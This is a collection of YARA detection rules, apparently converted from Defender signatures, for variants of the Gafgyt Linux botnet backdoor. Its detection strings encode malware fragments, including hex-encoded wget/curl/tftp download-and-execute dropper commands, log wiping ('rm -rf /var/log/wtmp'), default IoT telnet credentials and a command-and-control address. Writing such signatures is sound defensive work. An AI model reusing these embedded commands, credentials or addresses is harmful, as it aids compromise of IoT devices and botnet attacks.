        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "KQRIQRLQRLQRAQRTQRTQRK" ascii //weight: 1
        $x_1_2 = "LQROQRLQRNQROQRGQRTQRFQRO" ascii //weight: 1
        $x_1_3 = "UQRDQRP" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_AW_2147815944_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AW!xp"
        threat_id = "2147815944"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "/bin/busybox chmod 777" ascii //weight: 2
        $x_1_2 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_3 = "hlLjztqZ" ascii //weight: 1
        $x_1_4 = "32mStarting Scanner" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_1_*))) or
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_A_2147816093_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.A!xp"
        threat_id = "2147816093"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "mBot" ascii //weight: 1
        $x_1_2 = "killattk" ascii //weight: 1
        $x_1_3 = "udpflood" ascii //weight: 1
        $x_1_4 = "C2-Flood On %s:%d Finished" ascii //weight: 1
        $x_1_5 = "Killed %d Attacks" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Gafgyt_AB_2147816095_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AB!xp"
        threat_id = "2147816095"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "KT@$SIT@$SLT@$SLT@$SAT@$STT@$STT@$SK" ascii //weight: 1
        $x_1_2 = "LT@$SOT@$SLT@$SNT@$SOT@$SGT@$STT@$SFT@$SO" ascii //weight: 1
        $x_1_3 = "/T@$SbT@$SiT@$SnT@$S/T@$SbT@$SuT@$SsT@$SyT@$SbT@$SoT@$SxT@$S" ascii //weight: 1
        $x_1_4 = "UT@$SDT@$SP" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_AH_2147816096_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AH!xp"
        threat_id = "2147816096"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "KT@$SIT@$SLT@$SLT@$SAT@$STT@$STT@$SK" ascii //weight: 1
        $x_1_2 = "LT@$SOT@$SLT@$SNT@$SOT@$SGT@$STT@$SFT@$SO" ascii //weight: 1
        $x_1_3 = "JT@$SUT@$SNT@$SK" ascii //weight: 1
        $x_1_4 = "/T@$SbT@$SiT@$SnT@$S/T@$SbT@$SuT@$SsT@$SyT@$SbT@$SoT@$SxT@$S" ascii //weight: 1
        $x_1_5 = "UT@$SDT@$SP" ascii //weight: 1
        $x_1_6 = "GT@$SET@$STT@$SLT@$SOT@$SCT@$SAT@$SLT@$SIT@$SP" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_AG_2147816097_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AG!xp"
        threat_id = "2147816097"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "tor_add_sock" ascii //weight: 1
        $x_1_2 = "tcpraw" ascii //weight: 1
        $x_1_3 = "udpplain" ascii //weight: 1
        $x_1_4 = "main_instance_kill" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_AL_2147816098_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AL!xp"
        threat_id = "2147816098"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "hekkertelnet" ascii //weight: 1
        $x_1_2 = "SGSGWUD2" ascii //weight: 1
        $x_1_3 = "KGSVYGXA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_AO_2147816100_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AO!xp"
        threat_id = "2147816100"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "BTSOTSTTSKTSITSLTSL" ascii //weight: 2
        $x_1_2 = "KTSiTSlTSlTSiTSnTSgTS TSBTSoTStTSs" ascii //weight: 1
        $x_1_3 = "UTSDTSP" ascii //weight: 1
        $x_1_4 = "HTSOTSOTSDTSATSSTSSTSSTSHTSITST" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_AP_2147816102_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AP!xp"
        threat_id = "2147816102"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "kQRiQRlQRlQR QR-QR9QR QR%QRdQR" ascii //weight: 2
        $x_1_2 = "CQRHQREQRCQRKQRSQRUQRM" ascii //weight: 1
        $x_1_3 = "KQRIQRLQRLQRAQRLQRL" ascii //weight: 1
        $x_1_4 = "GQREQRTQRSQRPQROQROQRFQRS" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_AM_2147816104_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AM!xp"
        threat_id = "2147816104"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "gPDaPDyPDfPDgPDt" ascii //weight: 1
        $x_1_2 = "GPDEPDTPD PD/PDfPDuPDcPDkPD1PDhPDePDxPD" ascii //weight: 1
        $x_1_3 = "GPDEPDTPDLPDOPDCPDAPDLPDIPDP" ascii //weight: 1
        $x_1_4 = "PDrPDmPD PD-PDrPDfPD PDzPD" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_AS_2147816106_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AS!xp"
        threat_id = "2147816106"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "/bin/busybox LMAO" ascii //weight: 2
        $x_1_2 = "/dev/netslink/" ascii //weight: 1
        $x_1_3 = "npxXoudifFeEgGaACScs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_AS_2147816106_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AS!xp"
        threat_id = "2147816106"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "bQZuQZsQZyQZbQZoQZx" ascii //weight: 1
        $x_1_2 = "/QZdQZeQZvQZ/QZnQZeQZtQZsQZlQZiQZnQZkQZ/" ascii //weight: 1
        $x_1_3 = "KQZIQZLQZL" ascii //weight: 1
        $x_1_4 = "UQZDQZP" ascii //weight: 1
        $x_1_5 = "LQZIQZLQZBQZIQZTQZCQZH" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Gafgyt_AO_2147816312_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AO!MTB"
        threat_id = "2147816312"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/bin/busybox BOTNET" ascii //weight: 1
        $x_1_2 = "hacktheworld1337" ascii //weight: 1
        $x_1_3 = "mobiroot" ascii //weight: 1
        $x_1_4 = "tsunami" ascii //weight: 1
        $x_1_5 = "hunt5759" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_AX_2147816314_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AX!MTB"
        threat_id = "2147816314"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "STDPPS" ascii //weight: 1
        $x_1_2 = "SYNACK" ascii //weight: 1
        $x_1_3 = "LOLNOGTFO" ascii //weight: 1
        $x_1_4 = "HTTPHEX" ascii //weight: 1
        $x_1_5 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_6 = "TSource Engine Query + /x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79" ascii //weight: 1
        $x_1_7 = "telnetadmin" ascii //weight: 1
        $x_1_8 = "7ujMko0admin" ascii //weight: 1
        $x_1_9 = "TCPSLAM" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Gafgyt_AR_2147816315_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AR!MTB"
        threat_id = "2147816315"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {48 54 54 50 [0-4] 46 6c 6f 6f 64 69 6e 67}  //weight: 1, accuracy: Low
        $x_1_2 = "KILLATTK" ascii //weight: 1
        $x_1_3 = "LOLNOGTFO" ascii //weight: 1
        $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_5 = "185.244.25.155:443" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_AT_2147816316_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AT!MTB"
        threat_id = "2147816316"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {63 64 20 2f 74 6d 70 3b 20 77 67 65 74 20 68 74 74 70 3a 2f 2f [0-21] 2f [0-16] 2f [0-16] 3b 20 63 68 6d 6f 64 20 37 37 37 20 2a 3b 20 73 68 20 [0-16] 3b 20 74 66 74 70 20 2d 67 20 [0-21] 20 2d 72 20 74 66 74 70 2e 73 68 3b 20 63 68 6d 6f 64 20 37 37 37 20 2a 3b 20 73 68 20 74 66 74 70 2e 73 68 3b 20 72 6d 20 2d 72 66 20 2a 2e 73 68}  //weight: 1, accuracy: Low
        $x_1_2 = "www.billybobbot.com/crawler" ascii //weight: 1
        $x_1_3 = "96mBOT JOINED" ascii //weight: 1
        $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_BF_2147816317_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BF!MTB"
        threat_id = "2147816317"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "10"
        strings_accuracy = "Low"
    strings:
        $x_4_1 = {49 b9 01 01 01 01 01 01 01 01 40 0f b6 d6 4c 0f af ca 49 b8 ff fe fe fe fe fe fe fe 66 66 66 90 66 66 90 66 66 90}  //weight: 4, accuracy: High
        $x_4_2 = {48 8b 08 48 83 c0 08 4c 89 c2 4c 31 c9 48 01 ca 0f 83 [0-8] 48 31 ca 4c 09 c2 48 ff c2 0f 85 [0-8] 4c 31 c9 4c 89 c2 48 01 ca 0f 83 [0-8] 48 31 ca 4c 09 c2 48 ff c2 0f 85 [0-8] 48 8b 08 48 83 c0 08 4c 89 c2 4c 31 c9 48 01 ca 0f 83 [0-8] 48 31 ca 4c 09 c2 48 ff c2 0f 85 [0-8] 4c 31 c9 4c 89 c2 48 01 ca 73 75 48 31 ca 4c 09 c2 48 ff c2}  //weight: 4, accuracy: Low
        $x_1_3 = "TSource Engine Query" ascii //weight: 1
        $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_5 = "bot.com/crawler" ascii //weight: 1
        $x_1_6 = "nf1dk5a8eisr9i32" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_4_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_AQ_2147816318_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AQ!MTB"
        threat_id = "2147816318"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "scanner_kill" ascii //weight: 1
        $x_1_2 = "botnet_build" ascii //weight: 1
        $x_1_3 = "botnet_id" ascii //weight: 1
        $x_1_4 = "connect_cnc" ascii //weight: 1
        $x_1_5 = "attack_ptcp" ascii //weight: 1
        $x_1_6 = "attack_pudp" ascii //weight: 1
        $x_1_7 = "attack_start" ascii //weight: 1
        $x_1_8 = "attack_stop" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule Backdoor_Linux_Gafgyt_BE_2147816319_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BE!MTB"
        threat_id = "2147816319"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {63 64 20 2f 74 6d 70 3b 20 77 67 65 74 20 68 74 74 70 3a 2f 2f [0-21] 2f [0-16] 20 7c 7c 20 63 75 72 6c 20 2d 4f 20 68 74 74 70 3a 2f 2f [0-21] 2f [0-16] 3b 20 63 68 6d 6f 64 20 37 37 37}  //weight: 1, accuracy: Low
        $x_1_2 = "rm -rf /var/log/wtmp" ascii //weight: 1
        $x_1_3 = "pkill -9 busybox" ascii //weight: 1
        $x_1_4 = "BOTKILL" ascii //weight: 1
        $x_1_5 = "TELNET ON | OFF" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_AP_2147816320_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AP!MTB"
        threat_id = "2147816320"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {63 64 20 2f 74 6d 70 20 7c 7c 20 63 64 20 2f 76 61 72 2f 72 75 6e 20 7c 7c 20 63 64 20 2f 6d 6e 74 20 7c 7c 20 63 64 20 2f 72 6f 6f 74 20 7c 7c 20 63 64 20 2f 3b 20 77 67 65 74 20 68 74 74 70 3a 2f 2f [0-21] 2f [0-16] 3b 20 63 68 6d 6f 64 20 37 37 37 20 [0-16] 3b 20 73 68 20 [0-16] 3b 20 74 66 74 70 20 [0-21] 20 2d 63 20 67 65 74}  //weight: 1, accuracy: Low
        $x_1_2 = {63 68 6d 6f 64 20 37 37 37 20 [0-16] 3b 20 73 68 20 [0-16] 3b 20 72 6d 20 2d 72 66 20 [0-16] 20 [0-16] 20 [0-16] 3b 20 72 6d 20 2d 72 66 20 2a}  //weight: 1, accuracy: Low
        $x_1_3 = "STOLENBOTS" ascii //weight: 1
        $x_1_4 = "hunt5759" ascii //weight: 1
        $x_1_5 = {48 54 54 50 [0-5] 46 6c 6f 6f 64 69 6e 67}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Gafgyt_AS_2147816321_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AS!MTB"
        threat_id = "2147816321"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {63 64 20 2f 74 6d 70 20 7c 7c 20 63 64 20 2f 76 61 72 2f 72 75 6e 3b 77 67 65 74 20 68 74 74 70 3a 2f 2f [0-21] 2f [0-16] 3b 73 68 20 [0-16] 3b 72 6d 20 [0-16] 3b 74 66 74 70 20 2d 72 20 [0-16] 20 2d 67 20 [0-32] 3b 63 68 6d 6f 64 20 37 37 37}  //weight: 5, accuracy: Low
        $x_1_2 = "SCANZER ON | OFF" ascii //weight: 1
        $x_1_3 = "LOLNOGTFO" ascii //weight: 1
        $x_1_4 = "gayfgt" ascii //weight: 1
        $x_1_5 = "TELSCANNER" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_BD_2147816322_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BD!MTB"
        threat_id = "2147816322"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {63 68 6d 6f 64 20 37 37 37 20 [0-16] 3b 20 73 68 20 [0-16] 3b 20 74 66 74 70 20 [0-21] 20 2d 63 20 67 65 74}  //weight: 1, accuracy: Low
        $x_1_2 = "mirai" ascii //weight: 1
        $x_1_3 = "busyboxterrorist" ascii //weight: 1
        $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_AR_2147816323_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AR!xp"
        threat_id = "2147816323"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "K*^I*^L*^L*^A*^T*^T*^K" ascii //weight: 1
        $x_1_2 = "L*^O*^L*^N*^O*^G*^T*^F*^O" ascii //weight: 1
        $x_1_3 = "J*^U*^N*^K" ascii //weight: 1
        $x_1_4 = "U*^D*^P" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_AT_2147816324_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AT!xp"
        threat_id = "2147816324"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "pQRkQRiQRlQRlQR QR-QR9QR QRbQRuQRsQRyQRbQRoQRx" ascii //weight: 1
        $x_1_2 = "QRkQRiQRlQRlQRaQRlQRlQR QR-QR9QR QR%QRsQR" ascii //weight: 1
        $x_1_3 = "mQRiQRrQRaQRiQRMQRIQRRQRAQRI" ascii //weight: 1
        $x_1_4 = "UQRDQRP" ascii //weight: 1
        $x_1_5 = "FQRUQRCQRKQROQRFQRF" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Gafgyt_AU_2147816325_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AU!xp"
        threat_id = "2147816325"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "b*^o*^t*^:*^ *^%*^s*^\\*^n" ascii //weight: 1
        $x_1_2 = "L*^I*^L*^B*^I*^T*^C*^H" ascii //weight: 1
        $x_1_3 = "U*^D*^P" ascii //weight: 1
        $x_1_4 = "K*^I*^L*^L" ascii //weight: 1
        $x_1_5 = "L*^U*^C*^K*^Y*^L*^I*^L*^D*^U*^D*^E" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Gafgyt_AE_2147816435_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AE!MTB"
        threat_id = "2147816435"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {00 73 79 6e 00 72 73 74 00 66 69 6e 00 61 63 6b 00 70 73 68 00 55 44 50 00 54 43 50 00 53 54 4f 50 00 2f 00 11 00 3a 03 00 00 28 6e 75 6c 6c 29 00 61 6c 6c 00 2c}  //weight: 2, accuracy: Low
        $x_2_2 = {48 8b 45 e8 48 89 85 d0 fe ff ff 48 c7 85 c8 fe ff ff [0-5] 48 c7 85 c0 fe ff ff 04 00 00 00 fc 48 8b b5 d0 fe ff ff 48 8b bd c8 fe ff ff 48 8b 8d c0 fe ff ff f3 a6 0f 97 c2 0f 92 c0 89 d1 28 c1 89 c8 0f be c0 85 c0 75 0e 48 8b 45 d8 0f b6 50 0d 83 ca 08 88}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_AN_2147816819_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AN!xp"
        threat_id = "2147816819"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "B0TK1LL" ascii //weight: 2
        $x_1_2 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_3 = "Connection Refused Due To Dupe" ascii //weight: 1
        $x_1_4 = "mipsel" ascii //weight: 1
        $x_1_5 = "hlLjztqZ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_AX_2147817170_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AX!xp"
        threat_id = "2147817170"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "tcpcsum" ascii //weight: 2
        $x_2_2 = "rand_cmwc" ascii //weight: 2
        $x_2_3 = "checksum_tcp_udp" ascii //weight: 2
        $x_2_4 = "busyboxterrorist" ascii //weight: 2
        $x_2_5 = "Botkill" ascii //weight: 2
        $x_2_6 = "SENDBOTSTO" ascii //weight: 2
        $x_1_7 = "/usr/sbin/dropbear" ascii //weight: 1
        $x_1_8 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_9 = "hlLjztqZ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            ((2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Gafgyt_AY_2147817236_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AY!xp"
        threat_id = "2147817236"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "DPFLOOD" ascii //weight: 1
        $x_1_2 = "busybox wget" ascii //weight: 1
        $x_1_3 = "TCPFLOOD" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_AZ_2147817555_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.AZ!xp"
        threat_id = "2147817555"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "wkUxzvutsrqp_nm-ihgfFCcba" ascii //weight: 1
        $x_1_2 = "sending kill request" ascii //weight: 1
        $x_1_3 = "[killer] finding and killing processes holding port" ascii //weight: 1
        $x_1_4 = "[attack] starting attack" ascii //weight: 1
        $x_1_5 = "/proc/cpuinfo" ascii //weight: 1
        $x_1_6 = "npxXoudifFeEgGaACScs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Gafgyt_BB_2147817556_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Gafgyt.BB!xp"
        threat_id = "2147817556"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Gafgyt"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = "/usr/sbin/dropbear" ascii //weight: 2
        $x_2_2 = {77 67 65 74 20 68 74 74 70 3a 2f 2f [0-32] 2f 62 69 6e 73 2e 73 68}  //weight: 2, accuracy: Low
        $x_1_3 = "hlLjztqZ" ascii //weight: 1
        $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Gafgyt_BB_2147817556_1
